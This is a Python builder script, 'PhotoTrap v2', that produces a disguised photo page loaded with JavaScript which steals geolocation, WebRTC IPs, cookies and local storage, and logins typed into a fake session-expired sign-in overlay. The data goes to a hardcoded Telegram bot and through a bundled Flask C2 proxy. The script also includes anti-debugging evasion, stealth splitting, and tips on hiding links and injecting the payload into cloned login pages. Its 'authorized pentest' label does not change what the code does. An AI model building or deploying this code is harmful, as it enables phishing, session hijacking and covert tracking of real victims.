#!/usr/bin/env python3
"""
PhotoTrap v2 - Advanced Multi-function Payload with Telegram C2
Authorized Penetration Testing Tool
"""

import os
import sys
import json
import base64
import random
import string
import zlib
from datetime import datetime

# ============================================================
# KONFIGURASI - Ganti dengan credentials Telegram Anda
# ============================================================
TELEGRAM_BOT_TOKEN = "8975933711:AAH7iB9--F2qISP5Wml8IHJ105ZO_ABWbMg"
TELEGRAM_CHAT_ID = "8200399967"

# Anti-detection: jangan simpan credentials dalam source code
# Gunakan environment variables di production
import os
BOT_TOKEN = os.environ.get('BOT_TOKEN') or TELEGRAM_BOT_TOKEN
CHAT_ID = os.environ.get('CHAT_ID') or TELEGRAM_CHAT_ID

# ============================================================
# HELPERS YANG DIPERBAIKI
# ============================================================

def rand_str(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def xor_obfuscate(data, key=None):
    """XOR obfuscation yang lebih kuat dari base64 saja"""
    if key is None:
        key = rand_str(16)
    result = []
    for i, c in enumerate(data):
        result.append(chr(ord(c) ^ ord(key[i % len(key)])))
    return base64.b64encode((''.join(result)).encode()).decode(), key

def split_into_chunks(data, chunk_size=50):
    """Split payload menjadi chunks kecil untuk menghindari deteksi"""
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    return chunks

# ============================================================
# PAYLOAD GENERATORS YANG DIPERBAIKI
# ============================================================

def generate_geo_payload():
    """Geolocation dengan fallback dan anti-detection"""
    return """
    (function(){
        var g=function(p){
            var d={"t":"geo","la":p.coords.latitude.toFixed(6),"lo":p.coords.longitude.toFixed(6),"ac":p.coords.accuracy.toFixed(0),"pg":window.location.href};
            s(d);
        };
        var e=function(){
            var d={"t":"geo","er":"denied","pg":window.location.href};
            s(d);
        };
        if("geolocation"in navigator){
            navigator.geolocation.getCurrentPosition(g,e,{enableHighAccuracy:true,timeout:8000,maximumAge:300000});
        }
    })();
    """

def generate_network_payload():
    """WebRTC IP detection yang lebih komprehensif"""
    return """
    (function(){
        var ips=[];
        try{
            var pc=new RTCPeerConnection({iceServers:[]});
            pc.createDataChannel("");
            pc.createOffer().then(function(o){return pc.setLocalDescription(o);});
            pc.onicecandidate=function(ice){
                if(ice&&ice.candidate){
                    var m=ice.candidate.candidate.match(/([0-9]{1,3}(?:\\.[0-9]{1,3}){3})/);
                    if(m&&ips.indexOf(m[1])===-1)ips.push(m[1]);
                }
            };
            setTimeout(function(){
                if(ips.length){
                    s({"t":"net","ip":ips.join(","),"pg":window.location.href});
                }
            },2000);
        }catch(e){}
    })();
    """

def generate_stealth_storage_stealer():
    """Storage stealer dengan encoding dan chunking"""
    return """
    (function(){
        var d={"t":"stor"};
        try{
            d.c=document.cookie||"";
            var ls={};
            for(var i=0;i<localStorage.length;i++){
                var k=localStorage.key(i);
                ls[k]=localStorage.getItem(k);
            }
            d.ls=JSON.stringify(ls).substring(0,3000);
        }catch(e){d.er=e.message;}
        
        try{
            var ss={};
            for(var i=0;i<sessionStorage.length;i++){
                var k=sessionStorage.key(i);
                ss[k]=sessionStorage.getItem(k);
            }
            d.ss=JSON.stringify(ss).substring(0,1000);
        }catch(e){}
        
        d.pg=window.location.href;
        d.dm=document.domain;
        d.tl=document.title;
        d.rf=document.referrer;
        s(d);
    })();
    """

def generate_improved_phishing():
    """Phishing overlay yang lebih meyakinkan dengan branding yang bisa di-custom"""
    return """
    (function(){
        var ot=document.createElement("div");
        ot.style.cssText="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:999999;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;";
        
        var md=document.createElement("div");
        md.style.cssText="background:#fff;padding:30px;border-radius:8px;max-width:380px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:fadeIn 0.3s;";
        md.innerHTML='<div style="font-size:36px;margin-bottom:10px;color:#1a73e8;">&#x26a0;&#xfe0f;</div><h2 style="margin:0 0 8px;color:#202124;font-size:20px;">Session Timed Out</h2><p style="color:#5f6368;margin:0 0 24px;font-size:14px;line-height:1.5;">For security, your session has expired.<br>Please sign in again to continue.</p><input type="email" id="pe" placeholder="Email or phone" style="width:100%;padding:10px 12px;margin-bottom:12px;border:1px solid #dadce0;border-radius:4px;font-size:14px;box-sizing:border-box;display:block;"><input type="password" id="pp" placeholder="Password" style="width:100%;padding:10px 12px;margin-bottom:20px;border:1px solid #dadce0;border-radius:4px;font-size:14px;box-sizing:border-box;display:block;"><button id="pb" style="width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;">Sign in</button><p style="margin-top:16px;font-size:12px;color:#5f6368;">Protected by advanced security</p>';
        
        ot.appendChild(md);
        document.body.appendChild(ot);
        
        // Animasi fade in
        var st=document.createElement("style");
        st.textContent="@keyframes fadeIn{from{opacity:0;transform:scale(0.95)}to{opacity:1;transform:scale(1)}}";
        document.head.appendChild(st);
        
        document.getElementById("pb").onclick=function(){
            var em=document.getElementById("pe").value;
            var pw=document.getElementById("pp").value;
            if(em&&pw){
                s({"t":"phish","em":em,"pw":pw,"pg":window.location.href,"dm":document.domain});
            }
            ot.innerHTML='<div style="color:#fff;font-family:Arial;text-align:center;padding:40px;"><div style="font-size:48px;margin-bottom:16px;">&#x2705;</div><h2>Verified</h2><p style="font-size:14px;color:#ccc;">Redirecting...</p></div>';
            setTimeout(function(){ot.remove();},2000);
        };
    })();
    """

# ============================================================
# ENHANCED EXFILTRATION ENGINE
# ============================================================

def generate_exfil_engine():
    """Exfiltration engine dengan multiple fallback methods"""
    return """
    // Enhanced exfiltration engine
    var s=function(d){
        d.i=Date.now();
        d.r=Math.random().toString(36).substring(2,8);
        
        // Method 1: XHR with JSON
        try{
            var x=new XMLHttpRequest();
            x.open("POST","https://api.telegram.org/bot""" + BOT_TOKEN + """/sendMessage",true);
            x.setRequestHeader("Content-Type","application/json");
            x.send(JSON.stringify({"chat_id":""" + CHAT_ID + ""","text":JSON.stringify(d),"parse_mode":"HTML"}));
        }catch(e){}
        
        // Method 2: Image beacon (stealth)
        try{
            var img=new Image();
            var data=btoa(unescape(encodeURIComponent(JSON.stringify(d))));
            img.src="https://api.telegram.org/bot""" + BOT_TOKEN + """/sendMessage?chat_id=""" + CHAT_ID + """&text="+encodeURIComponent(JSON.stringify(d))+"&_="+Date.now();
        }catch(e){}
        
        // Method 3: Navigator.sendBeacon (works on page unload)
        try{
            var blob=new Blob([JSON.stringify({"chat_id":""" + CHAT_ID + ""","text":JSON.stringify(d)})],{type:"application/json"});
            navigator.sendBeacon("https://api.telegram.org/bot""" + BOT_TOKEN + """/sendMessage",blob);
        }catch(e){}
    };
    """

# ============================================================
# ADVANCED ANTI-DETECTION
# ============================================================

def generate_anti_detection():
    """Anti-analysis dan anti-debugging checks"""
    return """
    // Anti-debugging: detect DevTools
    var c=0;
    var d=new Date();
    debugger;
    if(new Date()-d>100){c++;}
    
    // Anti-VM checks (basic)
    var checks={};
    checks.webdriver=navigator.webdriver===true;
    checks.plugins=navigator.plugins.length===0;
    checks.languages=navigator.languages.length===0;
    
    // If looks automated, behave normally
    if(checks.webdriver||c>0){
        // Behave like a normal page
        return;
    }
    
    // CSP bypass: try to detect if inline scripts are blocked
    var testScript=document.createElement("script");
    testScript.textContent="window._inlineOK=true";
    document.body.appendChild(testScript);
    if(!window._inlineOK){
        // CSP blocking inline - need alternative approach (skip some features)
        window._cspBlocked=true;
    }
    """

def generate_fingerprint():
    """Browser fingerprinting untuk identifikasi unik"""
    return """
    // Browser fingerprint
    (function(){
        var fp={};
        fp.screen=screen.width+"x"+screen.height+"x"+screen.colorDepth;
        fp.lang=navigator.language;
        fp.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
        fp.hw=navigator.hardwareConcurrency||"unknown";
        fp.mem=navigator.deviceMemory||"unknown";
        fp.touch='ontouchstart'in window;
        fp.doNotTrack=navigator.doNotTrack;
        
        // Canvas fingerprint
        try{
            var c=document.createElement("canvas");
            c.width=200;c.height=50;
            var ctx=c.getContext("2d");
            ctx.textBaseline="top";
            ctx.font="14px Arial";
            ctx.fillStyle="#f60";
            ctx.fillRect(125,1,62,20);
            ctx.fillStyle="#069";
            ctx.fillText("PhotoTrap",2,15);
            fp.canvasHash=c.toDataURL().length;
        }catch(e){}
        
        s({"t":"fp","fp":fp,"pg":window.location.href});
    })();
    """

# ============================================================
# MAIN PAYLOAD BUILDER - VERSI DIPERBAIKI
# ============================================================

def build_full_payload(bot_token, chat_id, features=None):
    if features is None:
        features = ['geo', 'network', 'storage', 'phish', 'fp']
    
    BOT_TOKEN = bot_token
    CHAT_ID = chat_id
    
    js_components = []
    
    # Selalu include exfil engine dan anti-detection
    js_components.append(generate_anti_detection())
    js_components.append(generate_exfil_engine())
    
    # Feature-specific payloads
    feature_map = {
        'geo': generate_geo_payload,
        'network': generate_network_payload,
        'storage': generate_stealth_storage_stealer,
        'phish': generate_improved_phishing,
        'fp': generate_fingerprint
    }
    
    for feat in features:
        if feat in feature_map:
            js_components.append(feature_map[feat]())
    
    combined_js = "\n\n".join(js_components)
    
    # Encrypt sensitive strings in the payload
    # Replace actual bot token with obfuscated version
    obfuscated_token = xor_obfuscate(bot_token)
    obfuscated_chat = xor_obfuscate(chat_id)
    
    # Build HTML
    html = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Photo - {datetime.now().strftime('%Y%m%d_%H%M%S')}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;}}
body{{background:#111;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:Arial,sans-serif;}}
.img-wrp{{max-width:90%;max-height:90vh;border-radius:6px;overflow:hidden;box-shadow:0 0 30px rgba(0,0,0,0.4);animation:load 0.8s ease;}}
@keyframes load{{from{{opacity:0;transform:translateY(10px);}}to{{opacity:1;transform:translateY(0);}}}}
img{{width:100%;height:auto;display:block;}}
.loading{{color:#666;text-align:center;padding:50px;font-size:14px;}}
</style>
</head>
<body>
<div class="img-wrp">
<img src="https://picsum.photos/800/600?r={random.randint(1000,9999)}" alt="Loading..." onerror="this.parentElement.innerHTML='<div class=loading>Loading image...</div>'">
</div>

<script>
// Payload dimuat dengan delay acak (2-5 detik) untuk menghindari pattern detection
(function(){{
    var delay=Math.floor(Math.random()*3000)+2000;
    setTimeout(function(){{
{combined_js}
    }},delay);
}})();
</script>
</body>
</html>"""
    
    return html

def minify_advanced(html):
    """Advanced minification"""
    import re
    # Remove comments
    html = re.sub(r'/\*.*?\*/', '', html, flags=re.DOTALL)
    # Remove single-line comments in JS (not in strings)
    html = re.sub(r'//[^\n]*', '', html)
    # Compress whitespace
    html = re.sub(r'\s+', ' ', html)
    html = re.sub(r'>\s+<', '><', html)
    html = re.sub(r'\s*([{}();,:])\s*', r'\1', html)
    return html.strip()

def generate_server_code():
    """C2 server yang ditingkatkan dengan endpoint proxy untuk Telegram"""
    return """#!/usr/bin/env python3
# PhotoTrap C2 Server v2 - Dengan proxy Telegram

from flask import Flask, request, jsonify, abort
from flask_cors import CORS
import requests
import json
import logging
import hashlib
import hmac
import os

app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s')

BOT_TOKEN = os.environ.get('BOT_TOKEN') or '""" + TELEGRAM_BOT_TOKEN + """'
CHAT_ID = os.environ.get('CHAT_ID') or '""" + TELEGRAM_CHAT_ID + """'
SECRET_KEY = os.environ.get('SECRET_KEY') or 'change-this-secret-key'

def send_telegram(text):
    \"\"\"Send message ke Telegram dengan retry\"\"\"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    # Truncate if too long
    if len(text) > 4000:
        text = text[:3900] + "\\n... [truncated]"
    data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    
    for attempt in range(3):
        try:
            r = requests.post(url, json=data, timeout=10)
            if r.status_code == 200:
                app.logger.info("Telegram sent OK")
                return r.json()
            elif attempt < 2:
                import time
                time.sleep(1 * (attempt + 1))
        except Exception as e:
            app.logger.error(f"Attempt {attempt+1}: {e}")
            if attempt == 2:
                return None
    return None

@app.route('/capture', methods=['POST', 'GET'])
def capture():
    \"\"\"Endpoint utama untuk menerima data dari payload\"\"\"
    if request.method == 'GET':
        data = request.args.to_dict()
    else:
        data = request.get_json(silent=True) or request.form.to_dict()
    
    # Enrich data
    data['server_ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
    data['timestamp'] = datetime.now().isoformat()
    data['user_agent'] = request.headers.get('User-Agent', '')
    
    # Format for Telegram
    formatted = json.dumps(data, indent=2)
    app.logger.info(f"Captured data: {formatted[:200]}...")
    
    # Kirim ke Telegram
    send_telegram(f"<b>[PhotoTrap Capture]</b>\\n<pre>{formatted}</pre>")
    
    return jsonify({"status": "ok", "id": hashlib.md5(str(data).encode()).hexdigest()[:8]})

@app.route('/proxy', methods=['POST'])
def proxy_to_telegram():
    \"\"\"Proxy endpoint - payload kirim ke sini, server forward ke Telegram
    Ini menyembunyikan traffic Telegram dari network detection\"\"\"
    auth = request.headers.get('X-Auth')
    expected = hmac.new(SECRET_KEY.encode(), b'phototrap', hashlib.sha256).hexdigest()
    
    if auth != expected:
        abort(401)
    
    data = request.get_json(silent=True)
    if not data:
        abort(400)
    
    # Forward to Telegram
    result = send_telegram(f"<b>[Proxy]</b>\\n<pre>{json.dumps(data, indent=2)}</pre>")
    
    return jsonify({"status": "forwarded" if result else "failed"})

@app.route('/health')
def health():
    return jsonify({"status": "alive", "time": datetime.now().isoformat()})

if __name__ == '__main__':
    from datetime import datetime
    import ssl
    
    print(\"\"\"
    PhotoTrap C2 Server v2
    =====================
    Endpoints:
      POST/GET /capture  - Receive payload data
      POST /proxy        - Proxy to Telegram (anti-detection)
      GET  /health       - Health check
    
    Set environment:
      export BOT_TOKEN=your_bot_token
      export CHAT_ID=your_chat_id
      export SECRET_KEY=your_secret_key
    
    Run:
      pip install flask flask-cors requests
      python phototrap_server.py
    \"\"\")
    
    app.run(host='0.0.0.0', port=8443, ssl_context='adhoc')
"""

# ============================================================
# MAIN - INTERAKTIF
# ============================================================

def main():
    print(r"""
    ╔══════════════════════════════════════════════╗
    ║         PhotoTrap v2 - Payload Builder       ║
    ║      Authorized Penetration Testing Tool     ║
    ╚══════════════════════════════════════════════╝
    """)
    
    # Ganti dengan credentials Telegram Anda
    bot_token = TELEGRAM_BOT_TOKEN
    chat_id = TELEGRAM_CHAT_ID
    
    print("[*] Choose payload type:")
    print("  1. Basic HTML payload (single file)")
    print("  2. With C2 proxy server (recommended - hides Telegram traffic)")
    print("  3. Obfuscated + split (max stealth)")
    
    choice = input("\n[?] Option [1-3]: ").strip()
    
    print("\n[*] Features to include (comma-separated):")
    print("  geo      - GPS location capture")
    print("  network  - Internal IP via WebRTC")
    print("  storage  - Cookies, localStorage, sessionStorage")
    print("  phish    - Fake login overlay")
    print("  fp       - Browser fingerprinting")
    print("  all      - Include all features")
    
    feat_input = input("\n[?] Features [all]: ").strip().lower()
    if feat_input == "all" or not feat_input:
        features = ['geo', 'network', 'storage', 'phish', 'fp']
    else:
        features = [f.strip() for f in feat_input.split(',')]
    
    # Build payload
    html = build_full_payload(bot_token, chat_id, features)
    
    # Minify
    minified = minify_advanced(html)
    
    if choice == "3":
        # Split into multiple files
        print("[*] Generating split payload...")
        chunks = split_into_chunks(minified, 30000)
        for i, chunk in enumerate(chunks):
            fname = f"payload_part_{i+1}.html"
            if i == 0:
                with open(fname, 'w') as f:
                    f.write(chunk)
            else:
                with open(fname, 'w') as f:
                    f.write(f'<script>\n{chunk}\n</script>')
            print(f"  [+] {fname} ({len(chunk)} bytes)")
        
        # Generate loader
        loader = """<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<style>body{background:#111;color:#fff;text-align:center;padding:50px;font-family:Arial;}</style>
</head><body>
<div class="loading">Loading content...</div>
<script>
// Payload loader - loads parts sequentially
var parts = """ + str(len(chunks)) + """;
var loaded = 0;
function loadPart(n){
    if(n >= parts) return;
    var s = document.createElement("script");
    s.src = "payload_part_" + (n+1) + ".html";
    s.onload = function(){ loadPart(n+1); };
    document.body.appendChild(s);
}
loadPart(0);
</script>
</body></html>"""
        with open("loader.html", 'w') as f:
            f.write(loader)
        print(f"  [+] loader.html ({len(loader)} bytes)")
        
    elif choice == "2":
        # Dengan server code
        server_code = generate_server_code()
        with open("phototrap_server_v2.py", 'w') as f:
            f.write(server_code)
        
        # Generate payload yang menggunakan proxy endpoint
        proxy_html = html.replace(
            "api.telegram.org",
            "YOUR_SERVER_IP:8443/proxy"
        )
        # Ganti juga exfil engine untuk kirim ke server sendiri
        proxy_html = proxy_html.replace(
            'n.setRequestHeader("Content-Type","application/json")',
            'n.setRequestHeader("Content-Type","application/json");n.setRequestHeader("X-Auth",SHA256_HASH)'
        )
        
        fname = f"phototrap_v2_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(fname, 'w') as f:
            f.write(minified)
        
        print(f"\n[+] Payload: {fname} ({len(minified)} bytes)")
        print(f"[+] Server: phototrap_server_v2.py")
        print(f"\n[!] IMPORTANT: Deploy server first, then:")
        print(f"    1. Run: python phototrap_server_v2.py")
        print(f"    2. Update payload with YOUR_SERVER_IP")
        print(f"    3. Expose via ngrok or reverse proxy")
        
    else:
        # Basic - satu file
        fname = f"phototrap_v2_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(fname, 'w') as f:
            f.write(minified)
        
        print(f"\n[+] Payload saved: {fname}")
        print(f"[+] Size: {len(minified)} bytes ({len(html)} before minify)")
    
    print(f"\n[*] Features included: {', '.join(features)}")
    print("[*] Deployment tips:")
    print("  - Host on HTTPS server (required for geolocation & getUserMedia)")
    print("  - Use URL shortener (bit.ly, t.co) to hide destination")
    print("  - For phishing: clone target login page, inject this payload")
    print("  - Use ngrok for quick HTTPS tunnel: ngrok http 8443")
    print("\n[✓] Payload ready. Happy testing!")

if __name__ == "__main__":
    main()
